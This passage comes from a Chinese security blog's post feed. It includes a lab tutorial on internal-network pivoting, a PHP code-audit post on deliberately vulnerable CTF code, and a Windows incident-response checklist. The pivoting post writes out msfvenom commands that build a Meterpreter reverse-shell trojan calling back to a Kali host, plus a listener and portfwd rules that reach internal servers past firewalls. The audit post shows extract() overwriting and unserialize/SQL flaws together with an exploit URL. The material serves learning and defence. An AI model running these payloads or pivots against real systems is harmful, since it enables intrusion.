href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#48;&#x2e;&#49;&#x31;&#x35;">&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#48;&#x2e;&#49;&#x31;&#x35;</a></p><p>ssh –p 2222 <a href="mailto:&#119;&#x65;&#x62;&#64;&#x31;&#50;&#55;&#x2e;&#x30;&#46;&#x30;&#46;&#49;">&#119;&#x65;&#x62;&#64;&#x31;&#50;&#55;&#x2e;&#x30;&#46;&#x30;&#46;&#49;</a></p><h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><p><img src="/2023/09/26/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230926111209190.png" alt="image-20230926111209190"></p><p>外网：192.168.0.0&#x2F;24</p><p>内网：10.10.10.0&#x2F;24</p><p>kali：192.168.0.115</p><p>2008服务器：192.168.0.149&#x2F;10.10.10.132</p><p>数据服务器：10.10.10.128</p><ol><li><p>kali生成木马，上传至2008服务器。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span>.<span class="hljs-number">0.115</span> lport=<span class="hljs-number">4444</span> -f exe -o demo.exe<br><br>-p: payload<br>payload_name: 系统<span class="hljs-regexp">/架构/</span>作用/方式<br>lhost：kali<br>lport：监听的端口<br>-f：指定输出格式<br>-o：output<br></code></pre></td></tr></table></figure></li><li><p>创建监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.0.115<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br></code></pre></td></tr></table></figure></li><li><p>在2008服务器上运行我们上传的木马即可上线</p></li></ol><h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><ul><li>portfwd 是借用 meterpreter shell 建立的连接进行数据传输，达到端口转发的目的。</li><li>当建立反向连接时，可以绕过防火墙的检测。</li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">portfwd flush<br>portfwd add -L <span class="hljs-number">192.168.0.115</span> -l <span class="hljs-number">2020</span> -p <span class="hljs-number">80</span> -r <span class="hljs-number">10.10.10.128</span><br>将<span class="hljs-number">10.10.10.128</span>的<span class="hljs-number">80</span>端口映射到kali的<span class="hljs-number">2020</span>端口<br>即:访问http://<span class="hljs-number">192.168.0.115</span>:<span class="hljs-number">2020</span>/就能访问到内网主机的<span class="hljs-number">80</span>端口所对应的服务<br></code></pre></td></tr></table></figure><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">portfwd</span> add -l <span class="hljs-number">5555</span> -p <span class="hljs-number">3389</span> -r <span class="hljs-number">192.168.0.149</span><br></code></pre></td></tr></table></figure><p>将192.16.0.149的3389端口转发到本机的5555端口</p>]]></content>
    
    
    <categories>
      
      <category>内网代理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP_Bugs</title>
    <link href="/2023/09/22/PHP-Bugs/"/>
    <url>/2023/09/22/PHP-Bugs/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-Bugs"><a href="#PHP-Bugs" class="headerlink" title="PHP_Bugs"></a>PHP_Bugs</h1><h2 id="1-extract变量覆盖"><a href="#1-extract变量覆盖" class="headerlink" title="1. extract变量覆盖"></a>1. extract变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>; <br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))<br> &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)<br>    &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;ctf&#123;xxx&#125;&#x27;</span>; <br>    &#125;<br>   <span class="hljs-keyword">else</span><br>   &#123; <br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>   &#125; <br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码解析：</p><p>extract()：从数组中将变量导入到当前的符号表。在这里extract()函数被用来从<code>$_GET</code>全局数组中提取变量。如果一个键名和一个已存在的变量名相同，这个已存在的变量的值就会被重新覆盖。</p><p>isset()：检测变量是否已声明并且值不为null</p><p>file_get_contents：是一个php内置函数，用于以字符串的形式获取指定文件的内容，只需要向函数传递一个文件路径或者一个url地址即可.</p><p>trim：去除字符串开头和结尾的换行符或者是空格。</p><h3 id="1-1-存在的安全问题"><a href="#1-1-存在的安全问题" class="headerlink" title="1.1 存在的安全问题"></a>1.1 存在的安全问题</h3><p>这里的安全问题是<code>extract()</code>函数。这个函数的目的是从数组中导入变量到当前的符号表中。当与<code>$_GET</code>或其他用户输入的数组一起使用时，它可能会非常危险，因为用户可以覆盖已经存在的变量。例如，如果用户传递了<code>flag=malicious_value</code>作为一个GET参数，那么<code>$flag</code>变量将被重新赋值为<code>malicious_value</code>。</p><p>在这种情况下，攻击者可能会试图利用这一点，通过改变<code>$flag</code>的值来读取服务器上的其他文件或执行其他不当行为。</p><p>解决此安全问题的方法是不使用<code>extract()</code>函数，或者至少使用其第二个参数来限制被覆盖的变量，或确保变量不能被用户输入所修改。</p><p>例如，使用<code>extract($_GET, EXTR_SKIP)</code>可以确保不会覆盖现有的变量。</p><ul><li><p><strong><code>EXTR_OVERWRITE</code></strong></p><p>如果有冲突，覆盖已有的变量。</p></li><li><p><strong><code>EXTR_SKIP</code></strong></p><p>如果有冲突，不覆盖已有的变量。</p></li><li><p><strong><code>EXTR_PREFIX_SAME</code></strong></p><p>如果有冲突，在变量名前加上前缀 <code>prefix</code>。</p></li><li><p><strong><code>EXTR_PREFIX_ALL</code></strong></p><p>给所有变量名加上前缀 <code>prefix</code>。</p></li><li><p><strong><code>EXTR_PREFIX_INVALID</code></strong></p><p>仅在非法／数字的变量名前加上前缀 <code>prefix</code>。</p></li><li><p><strong><code>EXTR_IF_EXISTS</code></strong></p><p>仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 举个例子，以下情况非常有用：定义一些有效变量，然后从 <a href="https://www.php.net/manual/zh/reserved.variables.request.php">$_REQUEST</a> 中仅导入这些已定义的变量。</p></li><li><p><strong><code>EXTR_PREFIX_IF_EXISTS</code></strong></p><p>仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</p></li><li><p><strong><code>EXTR_REFS</code></strong></p><p>将变量作为引用提取。这有力地表明了导入的变量仍然引用了 <code>array</code> 参数的值。可以单独使用这个标志或者在 <code>flags</code> 中用 OR 与其它任何标志结合使用。</p></li></ul><p><strong>如果没有指定 <code>flags</code>，则被假定为 <code>EXTR_OVERWRITE</code>。</strong></p><p>总的来说，尽量避免直接使用用户输入（如<code>$_GET</code>、<code>$_POST</code>等）来进行文件操作或动态变量赋值，这是一个基本的安全最佳实践。</p><h3 id="1-2-flag"><a href="#1-2-flag" class="headerlink" title="1.2 flag"></a>1.2 flag</h3><p>使这两个变量都为 空即可：</p><p><a href="http://127.0.0.1/php_bugs-master/extract.php?shiyan=&flag=">http://127.0.0.1/php_bugs-master/extract.php?shiyan=&amp;flag=</a></p><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><h2 id="3-多重加密"><a href="#3-多重加密" class="headerlink" title="3. 多重加密"></a>3. 多重加密</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br>    <span class="hljs-variable">$requset</span> = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>, <span class="hljs-variable">$_SESSION</span>, <span class="hljs-variable">$_COOKIE</span>);<br>    <span class="hljs-comment">//把一个或多个数组合并为一个数组</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">db</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$where</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;where))<br>            &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;where);<br>            &#125;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$where</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&#x27;select * from user where &#x27;</span>.<span class="hljs-variable">$where</span>);<br>            <span class="hljs-comment">//函数执行一条 MySQL 查询。</span><br>            <span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$sql</span>);<br>            <span class="hljs-comment">//从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$requset</span>[<span class="hljs-string">&#x27;token&#x27;</span>]))<br>    <span class="hljs-comment">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span><br>    &#123;<br>        <span class="hljs-variable">$login</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">gzuncompress</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$requset</span>[<span class="hljs-string">&#x27;token&#x27;</span>])));<br>        <span class="hljs-comment">//gzuncompress:进行字符串压缩</span><br>        <span class="hljs-comment">//unserialize: 将已序列化的字符串还原回 PHP 的值</span><br><br>        <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">db</span>();<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-string">&#x27;user=\&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>        <span class="hljs-comment">//mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;user&#x27;</span>] === <span class="hljs-string">&#x27;ichunqiu&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] !== <span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;unserialize injection!!&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(╯‵□′)╯︵┴─┴ &quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php?error=1&#x27;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计之代码执行漏洞</title>
    <link href="/2023/09/22/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/09/22/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="代码执行漏洞原理"><a href="#代码执行漏洞原理" class="headerlink" title="代码执行漏洞原理"></a>代码执行漏洞原理</h1><p>​代码执行漏洞是指应用程序本身过滤不严，用户可以通过请求将代码注入到应用程序中执行。当应用在调用一些能将字符串转化成代码的函数（如php中的eval）时，没有考虑到用户时否能控制这个字符串，将造成代码注入漏洞。</p>]]></content>
    
    
    <categories>
      
      <category>PHP代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php代码审计</tag>
      
      <tag>代码执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux入侵排查</title>
    <link href="/2023/09/05/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
    <url>/2023/09/05/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="应急响应-Linux入侵排查"><a href="#应急响应-Linux入侵排查" class="headerlink" title="应急响应-Linux入侵排查"></a>应急响应-Linux入侵排查</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
      <tag>Linux应急</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows入侵排查</title>
    <link href="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
    <url>/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="应急响应-windows入侵排查"><a href="#应急响应-windows入侵排查" class="headerlink" title="应急响应-windows入侵排查"></a>应急响应-windows入侵排查</h1><span id="more"></span><p>常见的应急响应事件分类</p><p>web入侵：网页挂马、主页篡改、webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS共计、DNS劫持、ARP欺骗</p><h2 id="0x01-检查系统账号安全"><a href="#0x01-检查系统账号安全" class="headerlink" title="0x01 检查系统账号安全"></a>0x01 检查系统账号安全</h2><ol><li><p>查看服务器是否有弱口令，远程的管理端口是否对公网开放</p></li><li><p>查看服务器是否存在可疑账号、新增账号</p><ul><li>打开cmd窗口，输入lusrmgr.msc命令，查看是否有新增&#x2F;可疑账号</li></ul></li><li><p>查看服务器是否存在隐藏账号、克隆账号</p><ul><li>打开注册表，查看管理员对应键值：cmd-regedit</li></ul><p>\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/2.png" alt="image-20230903174751139"></p><ul><li><p>使用D盾_web查杀工具，它集成了对克隆账号检测的功能</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/1.png" alt="image-20230903173031766"></p></li></ul></li><li><p>结合日志，查看管理员登陆时间、用户名是否存在异常</p><ul><li>cmd-eventvwr.msc，打开事件管理器</li><li>导出windows日志-安全，利用log parser进行分析</li></ul></li></ol><h2 id="0x02-日志审计-Log-Praser"><a href="#0x02-日志审计-Log-Praser" class="headerlink" title="0x02 日志审计-Log Praser"></a>0x02 日志审计-Log Praser</h2><h3 id="2-1-查询登陆成功的事件"><a href="#2-1-查询登陆成功的事件" class="headerlink" title="2.1 查询登陆成功的事件"></a>2.1 查询登陆成功的事件</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><br><span class="hljs-number">1</span>、登陆成功的所有事件：<br>LogParser.exe -i:EVT –o:DATAGRID  <span class="hljs-string">&quot;SELECT * FROM D:\Security.evtx where EventID=4624&quot;</span><br><span class="hljs-number">2</span>、指定登录时间范围的事件：<br>LogParser.exe -i:EVT –o:DATAGRID  <span class="hljs-string">&quot;SELECT * FROM D:\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="hljs-number">3</span>、提取登陆成功的用户名和IP：<br>LogParser.exe -i:EVT –o:DATAGRID <span class="hljs-string">&quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM D:\Security.evtx where EventID=4624&quot;</span><br></code></pre></td></tr></table></figure><h3 id="2-2-查询登陆失败的事件"><a href="#2-2-查询登陆失败的事件" class="headerlink" title="2.2 查询登陆失败的事件"></a>2.2 查询登陆失败的事件</h3><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs F#"><span class="hljs-number">1</span>、登陆失败的所有事件：<br>LogParser.exe <span class="hljs-operator">-</span>i<span class="hljs-operator">:</span>EVT –o<span class="hljs-operator">:</span>DATAGRID &quot;SELECT <span class="hljs-operator">*</span> FROM D<span class="hljs-operator">:</span>\<span class="hljs-built_in">lock</span>.evtx where EventID<span class="hljs-operator">=</span><span class="hljs-number">4625</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">2、提取登录失败用户名进行聚合统计：</span><br><span class="hljs-string">LogParser.exe -i:EVT &quot;</span>SELECT EXTRACT_TOKEN(Strings,<span class="hljs-number">13</span>,<span class="hljs-string">&#x27;|&#x27;</span>)  <span class="hljs-keyword">as</span> EventType,EXTRACT_TOKEN(Strings,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27;|&#x27;</span>) <span class="hljs-keyword">as</span> user,count(EXTRACT_TOKEN(Strings,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27;|&#x27;</span>)) <span class="hljs-keyword">as</span> Times,EXTRACT_TOKEN(Strings,<span class="hljs-number">39</span>,<span class="hljs-string">&#x27;|&#x27;</span>) <span class="hljs-keyword">as</span> Loginip FROM D<span class="hljs-operator">:</span>\<span class="hljs-built_in">lock</span>.evtx where EventID<span class="hljs-operator">=</span><span class="hljs-number">4625</span> GROUP BY Strings<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>系统历史开关及记录：<br>LogParser.exe -i:EVT –o:DATAGRID “SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID&#x3D;6005 or EventID&#x3D;6006”</p><p>%%2307代表账号被锁定。<br>EXTRACT_TOKEN(Strings,5,’|’)函数是提取Strings中以|为分隔符的第5个值。</p><p>事件ID 说明<br>1102清理审计日志<br>4624账号成功登陆<br>4625账号登陆失败<br>4768kerberos身份认证（TGT请求）<br>4769kerberos服务票证请求<br>4776NTLM身份验证<br>4672 授予特殊权限<br>4720创建用户<br>4726删除用户<br>4728将成员添加到启用安全的全局组中<br>4729将成员从安全的全局组中移除<br>4732将成员添加到启用安全的本地组中<br>4733将成员从安全的本地组中移除<br>4756将成员添加到启用安全的通用组中<br>4757将成员从安全的通用组中移除<br>4719系统审计策略修改</p><h2 id="0x03-检查异常端口"><a href="#0x03-检查异常端口" class="headerlink" title="0x03 检查异常端口"></a>0x03 检查异常端口</h2><ul><li>netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</li><li>根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID”</li></ul><h2 id="0x04-检查异常进程"><a href="#0x04-检查异常进程" class="headerlink" title="0x04 检查异常进程"></a>0x04 检查异常进程</h2><ul><li><p>开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</p></li><li><p>打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p></li><li><p>通过微软官方提供的 Process Explorer 等工具进行排查 。</p></li><li><p>查看可疑的进程及其子进程。可以通过观察以下内容：</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/3.png" alt="image-20230903205606142"></p></li></ul><h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>查看端口对应的PID： <code>netstat -ano | findstr &quot;port&quot;</code></p><p>查看进程对应的PID：<code>任务管理器--查看--选择列--PID 或者 tasklist | findstr &quot;PID&quot;</code></p><p>杀掉对应的进程：taskkill &#x2F;F &#x2F;PID 21760</p><p>查看进程对应的程序位置：任务管理器–选择对应进程–右键打开文件位置</p><p>查看Windows服务所对应的端口： %system%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services（一般%system%就是</p><p>C:\Windows）</p><h2 id="0x05-检查启动项"><a href="#0x05-检查启动项" class="headerlink" title="0x05 检查启动项"></a>0x05 检查启动项</h2><ol><li><p>查看服务器是否有异常的启动项</p><p>win7：</p><p>[开始]&gt;[所有程序]&gt;[启动]，默认情况下此目录在是一个空目录，确认是否有非业务 程序在该目录下。</p><p>win10：</p><p>win11：</p><p><code>C:\Users\16037\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p></li><li><p>cmd-msconfig  查看是否存在命名异常的启动项目，是则取消勾选，并到相对应的路径下删除文件</p></li><li><p>cmd-regedit，打开注 册表，查看开机启动项是否正常，特别注意如下三个注册表项： HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce 检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p></li><li><p>利用安全软件查看启动项、开机时间管理等。</p></li><li><p>组策略，运行<strong>gpedit.msc</strong></p><p>win7：</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20230904112244355.png" alt="image-20230904112244355"></p></li></ol><h2 id="0x06-检查计划任务"><a href="#0x06-检查计划任务" class="headerlink" title="0x06 检查计划任务"></a>0x06 检查计划任务</h2><ol><li>【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</li><li>【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任 务，如有，则确认是否为正常连接。</li></ol><h2 id="0x07-检查服务自启动"><a href="#0x07-检查服务自启动" class="headerlink" title="0x07 检查服务自启动"></a>0x07 检查服务自启动</h2><p>服务自启动 检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20230904113841988.png" alt="image-20230904113841988"></p><h2 id="0x08-检查系统相关信息"><a href="#0x08-检查系统相关信息" class="headerlink" title="0x08 检查系统相关信息"></a>0x08 检查系统相关信息</h2><ol><li><p>systeminfo</p></li><li><p>查找可疑目录及文件</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">a、查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。 Window <span class="hljs-number">2003</span> C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings Window <span class="hljs-number">2008</span>R2 C:<span class="hljs-string">\Users\</span> <br>b、单击【开始】&gt;【运行】，输入%UserProfile%<span class="hljs-string">\Recent，分析最近打开分析可疑文件。</span> <br>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。 <br>d、回收站、浏览器下载目录、浏览器历史记录 <br>e、修改时间在创建时间之前的为可疑文件 <br></code></pre></td></tr></table></figure></li><li><pre><code class="hljs">得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</code></pre></li></ol><h2 id="0x09-自动化查杀"><a href="#0x09-自动化查杀" class="headerlink" title="0x09 自动化查杀"></a>0x09 自动化查杀</h2><p>病毒查杀</p><p>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</p><p>webshell查杀</p><p>检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规</p><p>则库的不足。</p><p><strong>1.6</strong> <strong>日志分析</strong></p><p>系统日志</p><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的</p><p>信息等。</p><p>b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p><p>WEB访问日志</p><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析</p><h2 id="0x10-工具篇"><a href="#0x10-工具篇" class="headerlink" title="0x10 工具篇"></a>0x10 工具篇</h2><h3 id="10-1-病毒分析"><a href="#10-1-病毒分析" class="headerlink" title="10.1 病毒分析"></a>10.1 病毒分析</h3><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a 